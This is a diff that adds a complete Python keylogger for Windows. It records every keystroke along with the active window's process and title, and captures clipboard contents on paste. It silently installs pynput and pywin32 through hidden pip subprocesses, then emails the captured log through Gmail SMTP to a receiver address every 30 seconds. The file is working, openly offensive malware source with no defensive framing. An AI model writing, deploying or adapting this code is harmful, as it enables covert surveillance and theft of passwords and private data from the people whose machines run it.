@@ -1,0 +1,353 @@
+import os
+import sys
+import time
+import smtplib
+import threading
+import subprocess
+from ctypes import windll, byref, create_unicode_buffer, c_ulong
+
+DEFAULT_EMAIL = ""
+DEFAULT_APP_PASSWORD = ""
+DEFAULT_RECEIVER_EMAIL = ""
+
+MAX_LOG_SIZE = 10 * 1024 * 1024
+
+class EmailSender:
+    def __init__(self, email, app_password):
+        self.email = email
+        self.app_password = app_password
+        self.smtp_server = "smtp.gmail.com"
+        self.smtp_port = 587
+    
+    def send(self, subject, body, receiver_email):
+        email_msg = f"Subject: {subject}\n\n{body}"
+        try:
+            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
+                server.starttls()
+                server.login(self.email, self.app_password)
+                server.sendmail(self.email, receiver_email, email_msg.encode('utf-8'))
+            return True
+        except Exception:
+            return False
+
+class KeyLogger:
+    def __init__(self, sender_email=None, sender_password=None, receiver_email=None, use_email=False):
+        self.log_dir = os.path.dirname(os.path.abspath(__file__))
+        self.log_path = os.path.join(self.log_dir, "log.txt")
+        self.user32 = windll.user32
+        self.kernel32 = windll.kernel32
+        self.psapi = windll.psapi
+        self.current_window = None
+        
+        self.use_email = use_email 
+        self.sender_email = sender_email
+        self.sender_password = sender_password
+        self.receiver_email = receiver_email
+        self.sender = EmailSender(sender_email, sender_password) if use_email else None
+        self.interval = 30  # 5 min.
+        self.running = True
+        
+        self.file_lock = threading.Lock()
+        self.report_thread = None
+        self.dependencies_installed = False
+        self._keyboard = None
+        self._win32clipboard = None
+
+    def write_log(self, content):
+        with self.file_lock:
+            if os.path.exists(self.log_path) and os.path.getsize(self.log_path) > MAX_LOG_SIZE:
+                backup = f"{self.log_path}.{int(time.time())}"
+                os.rename(self.log_path, backup)
+            
+            with open(self.log_path, "a", encoding="utf-8") as f:
+                f.write(content)
+
+    def read_and_clear_log(self):
+        with self.file_lock:
+            if os.path.exists(self.log_path):
+                with open(self.log_path, "r", encoding="utf-8") as f:
+                    content = f.read()
+                with open(self.log_path, "w", encoding="utf-8") as f:
+                    f.write(f"--- Log reset after email at {time.ctime()} ---\n")
+                return content
+            return ""
+
+    def read_log(self):
+        with self.file_lock:
+            if os.path.exists(self.log_path):
+                with open(self.log_path, "r", encoding="utf-8") as f:
+                    return f.read()
+        return ""
+
+    def clear_log(self):
+        with self.file_lock:
+            with open(self.log_path, "w", encoding="utf-8") as f:
+                f.write(f"--- Log cleared at {time.ctime()} ---\n")
+
+    def install_dependencies(self):
+        if self.dependencies_installed:
+            return True
+        
+        self.write_log(f"\n[INSTALLING DEPENDENCIES - {time.ctime()}]\n")
+        
+        try:
+            packages = ["pynput", "pywin32"]
+            
+            for package in packages:
+                self.write_log(f"[INSTALLING] {package}...\n")
+                
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                
+                result = subprocess.run(
+                    [sys.executable, "-m", "pip", "install", package],
+                    capture_output=True,
+                    text=True,
+                    timeout=180,
+                    startupinfo=startupinfo,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+                
+                if result.returncode != 0:
+                    error_msg = result.stderr.strip()
+                    self.write_log(f"[FAILED] {package}: {error_msg}\n")
+                    return False
+                else:
+                    self.write_log(f"[SUCCESS] {package} installed\n")
+            
+            self.write_log(f"[CONFIGURING] pywin32...\n")
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            
+            result = subprocess.run(
+                [sys.executable, "-m", "pywin32_postinstall", "-install"],
+                capture_output=True,
+                text=True,
+                timeout=60,
+                startupinfo=startupinfo,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            
+            if result.returncode != 0:
+                error_msg = result.stderr.strip()
+                self.write_log(f"[FAILED] pywin32 config: {error_msg}\n")
+                return False
+            
+            self.dependencies_installed = True
+            self.write_log(f"[SUCCESS] All dependencies installed!\n")
+            self.write_log(f"---\n")
+            return True
+            
+        except subprocess.TimeoutExpired as e:
+            self.write_log(f"[TIMEOUT] Installation took too long: {str(e)}\n")
+            return False
+        except Exception as e:
+            self.write_log(f"[ERROR] {str(e)}\n")
+            return False
+
+    def ensure_dependencies(self):
+        if self.dependencies_installed:
+            return True
+        
+        try:
+            import pynput
+            import win32clipboard
+            self.dependencies_installed = True
+            self.write_log("[INFO] Dependencies already installed\n")
+            return True
+        except ImportError:
+            self.write_log("[INFO] Dependencies not found, installing...\n")
+            if self.install_dependencies():
+                try:
+                    import pynput
+                    import win32clipboard
+                    self.dependencies_installed = True
+                    return True
+                except ImportError:
+                    self.write_log("[ERROR] Dependencies installed but import failed\n")
+                    return False
+            return False
+
+    def get_keyboard(self):
+        if not self.ensure_dependencies():
+            return None
+        if self._keyboard is None:
+            import pynput.keyboard as keyboard
+            self._keyboard = keyboard
+        return self._keyboard
+
+    def get_clipboard(self):
+        if not self.ensure_dependencies():
+            return None
+        if self._win32clipboard is None:
+            import win32clipboard
+            self._win32clipboard = win32clipboard
+        return self._win32clipboard
+
+    def report(self):
+        if not self.use_email:
+            return
+        
+        while self.running:
+            time.sleep(self.interval)
+            try:
+                log_content = self.read_and_clear_log()
+                if log_content.strip():
+                    success = self.sender.send(
+                        f"Keylogger Report - {time.ctime()}", 
+                        log_content, 
+                        self.receiver_email
+                    )
+                    if not success:
+                        with self.file_lock:
+                            with open(self.log_path, "a", encoding="utf-8") as f:
+                                f.write(f"\n--- Failed to send at {time.ctime()}, log restored ---\n")
+                                f.write(log_content)
+            except Exception:
+                pass
+
+    def get_current_process(self):
+        try:
+            hwnd = self.user32.GetForegroundWindow()
+            pid = c_ulong(0)
+            self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
+            h_process = self.kernel32.OpenProcess(0x410, False, pid)
+            if h_process:
+                try:
+                    executable = create_unicode_buffer(512)
+                    self.psapi.GetModuleBaseNameW(h_process, None, byref(executable), 512)
+                    window_title = create_unicode_buffer(512)
+                    self.user32.GetWindowTextW(hwnd, byref(window_title), 512)
+                    if window_title.value != self.current_window:
+                        self.current_window = window_title.value
+                        header = f"\n\n[ PID: {pid.value} - {executable.value} - {self.current_window} ]\n"
+                        self.write_log(header)
+                finally:
+                    self.kernel32.CloseHandle(h_process)
+        except Exception:
+            pass
+
+    def on_press(self, key):
+        self.get_current_process()
+        content = ""
+        
+        keyboard = self.get_keyboard()
+        if keyboard is None:
+            return
+        
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                content = key.char
+            
+            elif hasattr(key, 'vk'):
+                vk = key.vk
+                
+                if 96 <= vk <= 105:
+                    content = str(vk - 96)      # 0-9
+                elif vk == 106:
+                    content = " * "
+                elif vk == 107:
+                    content = " + "
+                elif vk == 109:
+                    content = " - "
+                elif vk == 110:
+                    content = "."
+                elif vk == 111:
+                    content = " / "
+                
+                elif vk == 8:
+                    content = " [BACKSPACE] "
+                elif vk == 9:
+                    content = " [TAB] "
+                elif vk == 13:
+                    content = "\n"
+                elif vk == 27:
+                    content = " [ESC] "
+                elif vk == 32:
+                    content = " "
+                elif vk == 192:
+                    content = "`"
+                
+                elif 37 <= vk <= 40:
+                    direction = {37: "LEFT", 38: "UP", 39: "RIGHT", 40: "DOWN"}
+                    content = f" [{direction.get(vk, '')}] "
+                
+                elif 160 <= vk <= 165:
+                    pass
+                
+                else:
+                    key_str = str(key).replace('Key.', '')
+                    content = f" [{key_str}] "
+            
+            else:
+                key_str = str(key).replace('Key.', '')
+                
+                # Ctrl+V
+                if key == keyboard.KeyCode.from_char('\x16'):
+                    try:
+                        clipboard = self.get_clipboard()
+                        if clipboard:
+                            clipboard.OpenClipboard()
+                            clip_data = clipboard.GetClipboardData()
+                            clipboard.CloseClipboard()
+                            content = f"\n[PASTE] - {clip_data}\n"
+                    except Exception:
+                        content = " [PASTE ERROR] "
+                    finally:
+                        try:
+                            clipboard = self.get_clipboard()
+                            if clipboard:
+                                clipboard.CloseClipboard()
+                        except Exception:
+                            pass
+                else:
+                    content = f" [{key_str}] "
+            
+            if content:
+                self.write_log(content)
+            
+        except Exception:
+            pass
+
+    def stop(self):
+        self.running = False
+
+    def run(self):
+        time.sleep(2)
+        
+        if not self.ensure_dependencies():
+            self.write_log("[FATAL] Cannot load dependencies, exiting...\n")
+            return
+        
+        keyboard = self.get_keyboard()
+        if keyboard is None:
+            return
+        
+        self.write_log(f"\n[KEYLOGGER STARTED - {time.ctime()}]\n")
+        
+        if self.use_email:
+            self.report_thread = threading.Thread(target=self.report, daemon=True)
+            self.report_thread.start()
+        
+        try:
+            with keyboard.Listener(on_press=self.on_press) as listener:
+                listener.join()
+        except KeyboardInterrupt:
+            self.stop()
+
+if __name__ == '__main__':
+    sender_email = DEFAULT_EMAIL
+    sender_password = DEFAULT_APP_PASSWORD
+    receiver_email = DEFAULT_RECEIVER_EMAIL
+    
+    logger = KeyLogger(
+        sender_email=sender_email, 
+        sender_password=sender_password, 
+        receiver_email=receiver_email, 
+        use_email=True
+    )
+    
+    try:
+        logger.run()
+    except (KeyboardInterrupt, SystemExit):
+        logger.stop()
